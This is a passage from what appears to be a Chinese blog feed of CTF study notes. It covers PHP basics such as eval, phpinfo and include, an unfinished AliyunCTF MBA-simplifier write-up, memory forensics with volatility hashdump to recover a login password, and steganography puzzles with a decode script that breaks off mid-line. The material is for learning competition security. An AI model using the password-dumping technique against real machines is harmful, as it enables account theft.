id="局部和全局作用域"><a href="#局部和全局作用域" class="headerlink" title="局部和全局作用域"></a>局部和全局作用域</h4><hr><p>在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用global关键字</p><h4 id="Static作用域："><a href="#Static作用域：" class="headerlink" title="Static作用域："></a>Static作用域：</h4><hr><p>当一个函数完成的时候，它的所有变量通常都会被删除，然而，有时候希望某个变量不要被删除，要做到这一点，请在第一次声明变量的时候使用Static关键字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$s</span>=<span class="number">0</span>; <span class="comment">//删除static关键字后，所有结果都是0</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="variable">$s</span>++;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL; <span class="comment">//换行符</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d3ba5488c538a9b5bcf04c.png" alt=""></p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>范例：preg_match(“/[a-zA-Z0-9~-=!\^+()]/“, $a);<br></p><pre><code>整个表达式用 / 包裹，这是正则表达式的开始和结束标记。&lt;br&gt;a-zA-Z0-9: 表示匹配任何大小写字母和数字。 &lt;br&gt;~-=!^+(): 表示匹配波浪号、减号、等号、感叹号、插入符号、加号和括号这些特定的符号。&lt;br&gt;</code></pre><p>在正则表达式中，反斜杠 \ 是一个特殊字符，它用于转义其他字符，使其失去原来的特殊含义，变成普通字符。以下是一些常见的情况，你可能需要使用反斜杠进行转义：<br> 转义特殊字符： 有些字符在正则表达式中具有特殊含义，例如 .、*、+、?、(、)、[、]、{、} 等。如果你想匹配这些字符本身，而不是它们的特殊含义，需要使用反斜杠进行转义。<br></p><h4 id="最常见且关键的函数"><a href="#最常见且关键的函数" class="headerlink" title="最常见且关键的函数"></a>最常见且关键的函数</h4><p><strong><code>preg_match()函数</code></strong>：匹配成功返回1,失败返回0</p><p><code>phpinfo()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phpinfo是一个函数（功能），这个函数会显示一个当前电脑（服务器）的详细的PHP信息。(有时也会藏flag)</p><p><strong><code>eval()函数：</code></strong></p><p>eval() 是一个在 PHP 中用于执行字符串作为 PHP 代码的函数。eval() 接受一个字符串参数 $code，该字符串包含要执行的 PHP 代码。当 eval() 被调用时，它会将字符串作为 PHP 代码解析并执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>文件包含是一种在编程中将一个文件的内容插入到另一个文件中的技术。在PHP中，文件包含通常使用include、require、include_once、require_once等语句来实现。例如include ‘flag.php’</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc周报01</title>
      <link href="/2025/02/24/misc%E5%91%A8%E6%8A%A501/"/>
      <url>/2025/02/24/misc%E5%91%A8%E6%8A%A501/</url>
      
        <content type="html"><![CDATA[<h2 id="misc周报01"><a href="#misc周报01" class="headerlink" title="misc周报01"></a>misc周报01</h2><p><strong><em>【古之立大事者，不惟有超世之材，亦必有坚忍不拨之志        ——苏轼】</em></strong></p><h3 id="AliyunCTF-题目复现"><a href="#AliyunCTF-题目复现" class="headerlink" title="AliyunCTF 题目复现"></a>AliyunCTF 题目复现</h3><h4 id="题目：mba"><a href="#题目：mba" class="headerlink" title="题目：mba"></a>题目：mba</h4><p>首先，要清楚这个题是干什么的。</p><p><code>题目：mba</code></p><p><code>I rolled my own MBA simplifier, but how disastrous could it be?</code></p><p>根据题目描述，这道题是关于一个mba简化器的，了解一下mba:</p><p><code>MBA混淆算法是一种用于软件保护和恶意软件混淆的技术。它通过将算术运算（如加法、乘法）和布尔运算（如与、或、非）混合，生成复杂的表达式，从而增加代码的可读性和逆向工程的难度。这种算法常用于软件加固和恶意软件中，以隐藏核心逻辑</code></p><p>MBA表达式：</p><p><img src="https://pic1.imgdb.cn/item/67c00e97d0e0a243d406e354.png"  /></p><p>根据官方WP的解释，这是一个基于MBA-Blast算法的简易MBA简化器。</p><hr><p>我们首先查看题目中有用的附件：</p><p><img src="https://pic1.imgdb.cn/item/67c001c3d0e0a243d406c9ac.png" alt=""></p><h5 id="【1】new-tactic-patch"><a href="#【1】new-tactic-patch" class="headerlink" title="【1】new-tactic.patch"></a>【1】new-tactic.patch</h5><p>在patches文件夹中，是new-tactic.patch文件，（<code>.patch</code> 文件是一种用于描述代码变更的文本文件，通常用于版本控制系统（如 Git、SVN 等）或软件开发中。它记录了文件的修改、添加或删除操作，以便将这些变更应用到其他代码库或分支中。<code>.patch</code> 文件的核心作用是提供一种标准化的方式来传递和应用代码变更。）</p><p>那么我们可以得知，官方WP中提到的Tactic的内容应该在这个文件中。<code>WP：本题实现了一个基于MBA-Blast算法的简易的MBA简化器。具体的逻辑被作为一个Tactic实现在了Z3Prover的内部，并通过Z3 Python API调用</code></p><p>我们可以在其中查看<strong>mba_tactic.cpp</strong>的内容：</p><p><strong>&lt;简单说下结论，mba_tactic.cpp就是用来实现Z3 定理证明器来解析和验证布尔代数表达式&gt;</strong></p><p>（在<code>mba_tactic.cpp</code> 文件实现了一个 Z3 策略，用于处理和简化 MBA 表达式。它通过递归构建表达式、计算基向量组合来简化表达式，并提供了多个辅助函数来处理布尔函数和位向量表达式。</p><p>它定义了一个名为 <code>mba_tactic</code> 的类，该类通过重载 Z3 的 <code>tactic</code> 接口来实现 MBA 表达式的简化逻辑。</p><p>这个策略使用 MBA-Blast 算法来简化 MBA 表达式，尝试找到更简单的等价表达式。</p><p><code>mba_tactic.cpp</code> 负责处理位向量（bit-vector）运算和布尔逻辑，将它们转换为简化的数学形式。）</p><h5 id="【2】server-py"><a href="#【2】server-py" class="headerlink" title="【2】server.py"></a>【2】server.py</h5><p><strong>&lt;同样先说结论：server.py 类似于主程序，用来处理用户的输入，并给出对应的结果&gt;</strong></p><p>一个 Python 程序，它使用 Z3 定理证明器来解析和验证布尔代数表达式。（它使用 Z3 Python API 来调用 <code>mba_tactic</code> 实现的逻辑，从而利用 Z3 定理证明器的能力。<code>server.py</code> 负责接收用户输入的表达式，将其解析为 <code>MBAExpr</code> 对象，然后使用 <code>mba_tactic</code> 进行简化。）</p><p>程序的主要逻辑如下：</p><p><strong>定义语法规则：</strong>使用 Lark 库定义了一套语法规则（Rule），用于解析布尔代数表达式。表达式可以包含变量（如 x 和 y）、布尔运算符（如 &amp;、|、^）、一元取反操作符（~）、整数常量以及括号。<br><strong>解析器：</strong>使用 Lark 库生成两个解析器（P 和 PT），分别用于解析完整的表达式和单个项。<br><strong>转换器：</strong>定义了一个转换器类 MBATransformer，用于将解析得到的抽象语法树（AST）转换为内部表示的 MBAExpr 对象。<br><strong>布尔函数和 MBA 表达式：</strong><br>    BoolFunction 类表示布尔函数，可以是单个变量、取反变量或两个变量之间的布尔运算。<br>    MBAExpr 类表示多线性布尔代数表达式，由多个项组成，每个项是一个系数和一个布尔函数的组合。<br><strong>Z3 集成：</strong>使用 Z3 库将 BoolFunction 和 MBAExpr 转换为 Z3 表达式，以便进行逻辑验证。<br><strong>主逻辑：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.serve_challenge 函数是程序的主入口，它提示用户输入一个布尔代数表达式，然后尝试解析和验证该表达式。</span><br><span class="line">2.用户输入的表达式首先被解析为 MBAExpr 对象。</span><br><span class="line">3.如果表达式有效（不超过 200 个字符，项数不超过 15），则使用 Z3 定理证明器检查表达式是否恒等（即 expr != expr 是否为不可满足）。</span><br><span class="line">4.如果表达式恒等，输出 &quot;It works!&quot;；否则，输出flag</span><br></pre></td></tr></table></figure><hr><p>那么，通过分析附件，我们知道：<strong><em>要想获取flag，我们需要做的事情就是构造一个符合要求的布尔代数表达式，使得使用z3定理证明器检查时，表达式不恒等！</em></strong></p><p>假设现在我们已经有了一个表达式s，我们来分析它是怎样被进行检查的：</p><p>代码中，MBA 表达式被定义为一个包含多个项（<code>coterms</code>）的对象，每个项是一个系数和布尔函数的组合。代码中定义了 <code>MBAExpr</code> 类和 <code>BoolFunction</code> 类来表示和处理 MBA 表达式。</p><p>表达式首先被解析为 <code>MBAExpr</code> 对象的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义 MBATransformer 类，该类继承自 Lark 的 Transformer，</span></span><br><span class="line"><span class="comment"># 用于将解析得到的抽象语法树（AST）转换为 MBAExpr 对象。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MBATransformer</span>(<span class="title class_ inherited__">Transformer</span>):</span><br><span class="line">    <span class="comment"># Transformer 中定义了各种方法，用于处理解析树中的不同节点，</span></span><br><span class="line">    <span class="comment"># 并构建 MBAExpr 对象。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义解析器 P，用于解析完整的表达式。</span></span><br><span class="line">P = Lark(Rule, parser=<span class="string">&#x27;lalr&#x27;</span>, start=<span class="string">&#x27;start&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 parse 函数，它使用 MBATransformer 转换器和解析器 P，</span></span><br><span class="line"><span class="comment"># 将输入的表达式字符串解析为 MBAExpr 对象。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">expr: <span class="built_in">str</span></span>) -&gt; MBAExpr:</span><br><span class="line">    <span class="keyword">return</span> MBATransformer().transform(P.parse(expr))</span><br></pre></td></tr></table></figure><p>在主函数 <code>serve_challenge</code> 中，调用 <code>parse</code> 函数来解析用户输入的表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">serve_challenge</span>():</span><br><span class="line">    FLAG = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;aliyunctf&#123;this_is_a_test_flag&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    expr = <span class="built_in">input</span>(<span class="string">&quot;Please enter the expression: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(expr) &gt; <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Expression is too long&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mba = parse(expr)  <span class="comment"># 这里调用 parse 函数解析表达式</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Could not parse the expression&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(mba.coterms) &gt; <span class="number">15</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Too many terms&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ... (后续逻辑处理)</span></span><br></pre></td></tr></table></figure><p>在上述代码中，<code>parse</code> 函数是解析过程的关键，它接受一个字符串形式的表达式，通过 Lark 解析器和 <code>MBATransformer</code> 转换器将其转换为 <code>MBAExpr</code> 对象</p><p><code>terms</code> 是 <code>MBAExpr</code> 类的一个属性，它是一个列表，包含表达式的各个项（coterms）。每个项是一个元组，由一个<strong>整数系数</strong>和一个 <strong><code>BoolFunction</code> 对象</strong>组成。这些项代表了多线性布尔代数（MBA）表达式的各个部分。</p><p><strong>&lt;回顾一下&gt;</strong></p><p><img src="https://pic1.imgdb.cn/item/67c00e97d0e0a243d406e354.png" style="zoom:80%;" /></p><p>以下是相关代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MBAExpr</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, coterms: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, BoolFunction]]</span>):</span><br><span class="line">        <span class="variable language_">self</span>._coterms = coterms</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...（其他方法）...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">coterms</span>(<span class="params">self</span>) -&gt; <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, BoolFunction]]:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._coterms</span><br></pre></td></tr></table></figure><p>在这个类中：</p><ul><li><code>__init__</code> 方法用于初始化 <code>MBAExpr</code> 对象，接受一个包含多个项（coterms）的列表作为参数。</li><li><code>coterms</code> 属性是一个只读属性，返回 <code>MBAExpr</code> 对象中存储的项列表。</li></ul><p>每个项（coterm）可以表示为：</p><ul><li>一个整数系数，表示该项在表达式中的权重。</li><li>一个 <code>BoolFunction</code> 对象，表示该项对应的布尔函数。</li></ul><p>例如，一个 MBA 表达式 <code>2*(x &amp; y) + 3*(~x)</code> 可以被分解为两个项：</p><ol><li><code>(2, BoolFunction(&#39;&amp;&#39;, [&#39;x&#39;, &#39;y&#39;]))</code></li><li><code>(3, BoolFunction(&#39;~&#39;, [&#39;x&#39;]))</code></li></ol><p>其中，这两项中的系数项通过coeff_type存放的（long long 类型）</p><p><strong>[呃呃，不会了]</strong></p><p><strong>【求助ing………………………….】</strong></p><p>使用 Z3 定理证明器检查表达式是否恒等的部分主要集中在 <code>check_expression</code> 函数中。以下是该函数的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_expression</span>(<span class="params">t: z3.Tactic, e: MBAExpr</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">  expr = e.to_z3expr(<span class="number">64</span>)</span><br><span class="line">  s = t.solver()</span><br><span class="line">  s.add(expr != expr)</span><br><span class="line"></span><br><span class="line">  s.<span class="built_in">set</span>(<span class="string">&#x27;timeout&#x27;</span>, <span class="number">30000</span>)   <span class="comment"># 30 seconds</span></span><br><span class="line">  r = s.check()</span><br><span class="line">  <span class="keyword">if</span> r == z3.unknown:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Solver timed out&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">return</span> r == z3.unsat</span><br></pre></td></tr></table></figure><p>这段代码的工作流程如下：</p><ol><li>将 <code>MBAExpr</code> 对象 <code>e</code> 转换为 Z3 表达式 <code>expr</code>，假设表达式使用的位数为 64。</li><li>创建一个 Z3 求解器 <code>s</code>。</li><li>向求解器添加约束 <code>expr != expr</code>，这是一个恒等式，如果表达式有效，则此约束应导致求解器返回 不可满足（unsatisfiable）。</li><li>设置求解器的超时时间为 30 秒。</li><li>调用求解器的 <code>check</code> 方法来检查约束是否可满足。</li><li>如果求解器返回 <code>z3.unknown</code>（表示超时或出错），则打印超时信息并退出程序。</li><li>如果求解器返回 <code>z3.unsat</code>（表示约束不可满足），则返回 <code>True</code>，表示表达式恒等。</li></ol><h3 id="本周取证专题练习（NSSCTF）"><a href="#本周取证专题练习（NSSCTF）" class="headerlink" title="本周取证专题练习（NSSCTF）"></a>本周取证专题练习（NSSCTF）</h3><p><strong><em><del>（源自NSSCTF的取证题）</del></em></strong></p><h4 id="题目：-蓝帽杯-2022-初赛-计算机取证-1"><a href="#题目：-蓝帽杯-2022-初赛-计算机取证-1" class="headerlink" title="题目：[蓝帽杯 2022 初赛]计算机取证_1"></a>题目：[蓝帽杯 2022 初赛]计算机取证_1</h4><p>内存取证题目</p><p><img src="https://pic1.imgdb.cn/item/67bf0f02d0e0a243d40627ce.png" alt=""></p><p>直接使用volatility：</p><p><img src="https://pic1.imgdb.cn/item/67bf19c6d0e0a243d40630f6.png" alt=""></p><p>因为题目要求获得taqi7的开机密码，所以使用hashdump，拿到密码的哈希值</p><p><img src="https://pic1.imgdb.cn/item/67bf1a37d0e0a243d406316b.png" alt=""></p><p>解密后拿到flag：</p><p><img src="https://pic1.imgdb.cn/item/67bf1d41d0e0a243d4063354.png" alt=""></p><h4 id="题目：-蓝帽杯-2022-初赛-计算机取证-2"><a href="#题目：-蓝帽杯-2022-初赛-计算机取证-2" class="headerlink" title="题目：[蓝帽杯 2022 初赛]计算机取证_2"></a>题目：[蓝帽杯 2022 初赛]计算机取证_2</h4><p>要查看制作该内存镜像的进程Pid号：</p><p><img src="https://pic1.imgdb.cn/item/67bf1fe1d0e0a243d4063857.png" alt=""></p><p><img src="https://pic1.imgdb.cn/item/67bf1fbed0e0a243d40637c1.png" alt=""></p><h3 id="buuCTF-misc部分题目记录"><a href="#buuCTF-misc部分题目记录" class="headerlink" title="buuCTF misc部分题目记录"></a>buuCTF misc部分题目记录</h3><h4 id="题目01：SXMgdGhpcyBiYXNlPw"><a href="#题目01：SXMgdGhpcyBiYXNlPw" class="headerlink" title="题目01：SXMgdGhpcyBiYXNlPw=="></a>题目01：SXMgdGhpcyBiYXNlPw==</h4><p>第一步，题目为base64编码，先翻译过来：Is this base?，可知题目应当与base有关，打开题目，果然看到一连串的base64。</p><p>对其解密，得到明文：</p><p><img src="https://pic1.imgdb.cn/item/67bc571dd0e0a243d4039290.png" alt=""></p><p>这是法语歌曲《L’Assasymphonie》（杀人交响曲）的歌词，出自法国音乐剧《Mozart L’opéra Rock》（摇滚莫扎特），然而，我们将明文进行base64加密后，却发现与原来的base64编码不同！</p><p><img src="https://pic1.imgdb.cn/item/67bc5793d0e0a243d4039310.png" alt=""></p><p>因此，这道题目实质考察base64的隐写，使用脚本进行解密：</p><p><img src="https://pic1.imgdb.cn/item/67bc5863d0e0a243d40393e1.png" alt=""></p><p>得到flag！</p><h4 id="题目02：间谍启示录"><a href="#题目02：间谍启示录" class="headerlink" title="题目02：间谍启示录"></a>题目02：间谍启示录</h4><p>非常简单的题目</p><p>iso镜像,直接使用foremost文件提取，在提取出来的rar压缩包中发现flag.exe!</p><p>注意这里如果直接打开iso镜像似乎是得不到flag.exe的</p><p><img src="https://pic1.imgdb.cn/item/67bc5af3d0e0a243d40396fd.png" alt=""></p><p>解压并运行，得到flag！</p><p><img src="https://pic1.imgdb.cn/item/67bc5b5dd0e0a243d403977a.png" alt=""></p><h4 id="题目03：喵喵喵"><a href="#题目03：喵喵喵" class="headerlink" title="题目03：喵喵喵"></a>题目03：喵喵喵</h4><p>图片放入StegSolve,在RGB的0通道发现异常，推测存在LSB隐写</p><p><img src="https://pic1.imgdb.cn/item/67bc5ed4d0e0a243d4039988.png" alt=""></p><p>在其BGR通道，发现一张png图片：</p><p><img src="https://pic1.imgdb.cn/item/67bc5f45d0e0a243d40399ee.png" alt=""></p><p>将其16进制数据导出，我们发现它（png）的文件头有问题，正常应该是89 50 4e……，将其文件头恢复，保存为png:</p><p><img src="https://pic1.imgdb.cn/item/67bc5f82d0e0a243d4039a3f.png" alt=""></p><p>发现这是一张二维码，但是只有一半：</p><p><img src="https://pic1.imgdb.cn/item/67bc6115d0e0a243d4039c43.png" alt=""></p><p>很明显的修改了图片的高度，将其放入随波逐流，恢复原宽高：</p><p><img src="https://pic1.imgdb.cn/item/67bc6177d0e0a243d4039cb6.png" alt=""></p><p>扫码后，是一串网址，打开百度网盘，下载flag压缩包（本以为flag出来了，没想到还是隐写）</p><p><img src="https://pic1.imgdb.cn/item/67bc621fd0e0a243d4039d6e.png" alt=""></p><p>这里是NTFS文件流隐写，使用AlternateStreamView进行扫描，导出flag.pyc文件</p><p>这里使用在线工具进行反编译，拿到源代码：</p><p><img src="https://pic1.imgdb.cn/item/67bc6356d0e0a243d4039ec0.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">    flag = <span class="string">&#x27;*************&#x27;</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        s = <span class="built_in">chr</span>(i ^ <span class="built_in">ord</span>(flag[i]))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) - <span class="number">10</span></span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>(s))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ciphertext[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">ciphertext = [</span><br><span class="line">    <span class="string">&#x27;96&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;65&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;93&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;91&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;97&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;22&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;93&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;70&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;102&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;94&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;132&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;46&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;112&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;64&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;97&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;88&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;82&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;137&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;109&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;99&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;112&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>加密过程分析</strong></p><ol><li><strong>初始化</strong>:<ul><li><code>flag</code> 是一个字符串，假设为 <code>&#39;*************&#39;</code>（实际内容未知）。</li><li><code>ciphertext</code> 是一个空列表，用于存储加密后的结果。</li></ul></li><li><strong>加密循环</strong>:<ul><li>遍历 <code>flag</code> 中的每个字符，索引为 <code>i</code>。</li><li>对每个字符进行以下操作：<ul><li><code>s = chr(i ^ ord(flag[i]))</code>：将字符的 ASCII 码与索引 <code>i</code> 进行异或操作，然后转换回字符。</li><li>如果 <code>i</code> 是偶数，则将 <code>s</code> 的 ASCII 码加 10。</li><li>如果 <code>i</code> 是奇数，则将 <code>s</code> 的 ASCII 码减 10。</li><li>将处理后的 <code>s</code> 转换为字符串并添加到 <code>ciphertext</code> 列表中。</li></ul></li></ul></li><li><strong>反转列表</strong>:<ul><li>最后，将 <code>ciphertext</code> 列表反转，得到最终的加密结果。</li></ul></li></ol><p><strong>解密过程</strong></p><p>为了解密 <code>ciphertext</code>，我们需要逆向执行上述加密步骤：</p><ol><li><strong>反转列表</strong>:<ul><li>首先将 <code>ciphertext</code> 反转，得到原始的加密顺序。</li></ul></li><li><strong>解密循环</strong>:<ul><li>遍历 <code>ciphertext</code> 中的每个字符串，索引为 <code>i</code>。</li><li>对每个字符串进行以下操作：<ul><li>将字符串转换为整数 <code>s</code>。</li><li>如果 <code>i</code> 是偶数，则将 <code>s</code> 减去 10。</li><li>如果 <code>i</code> 是奇数，则将 <code>s</code> 加上 10。</li><li>将 <code>s</code> 转换回字符，然后与索引 <code>i</code> 进行异或操作，得到原始的 <code>flag</code> 字符。</li></ul></li></ul></li></ol><p>写出解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    ciphertext = ciphertext[::-<span class="number">1</span>]  <span class="comment"># 反转列表</span></span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">        s = <span class="built_in">int</span>(ciphertext[i])</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s -= <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s += <span class="number">10</span></span><br><span class="line">        s = <span class="built_in">chr</span>(i ^ s)</span><br><span class="line">        flag.append(s)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"></span><br><span class="line">ciphertext = [</span><br><span class="line">    <span class="string">&#x27;96&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span 